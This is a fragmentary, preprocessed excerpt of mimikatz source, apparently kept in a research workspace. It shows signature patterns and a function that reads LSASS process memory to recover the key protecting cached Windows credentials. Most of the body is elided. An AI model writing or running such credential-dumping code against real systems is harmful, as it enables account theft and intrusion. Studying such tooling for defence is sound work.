# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c"
...
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = {
...
KULL_M_PATCH_GENERIC PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef[] = {
 ...
 {KULL_M_WIN_BUILD_BLUE, {sizeof(PTRN_WALL_LsaInitializeProtectedMemory_KEY), PTRN_WALL_LsaInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
...
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset)
{
 ...
 {
 #if defined(_M_ARM64)
  if (aLsassMemory->address = kull_m_memory_arm64_getRealAddress(aLsassMemory, armOffset))
  {
 #elif defined(_M_X64)
  LONG offset64;
  aLocalMemory.address = &offset64;
  ...
  if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
  {
   ...
   if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
   {
    ...
    if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(KIWI_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
    {
     ...
     if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille) && ((PKIWI_BCRYPT_KEY) buffer)->tag == 'MSSK')
     {
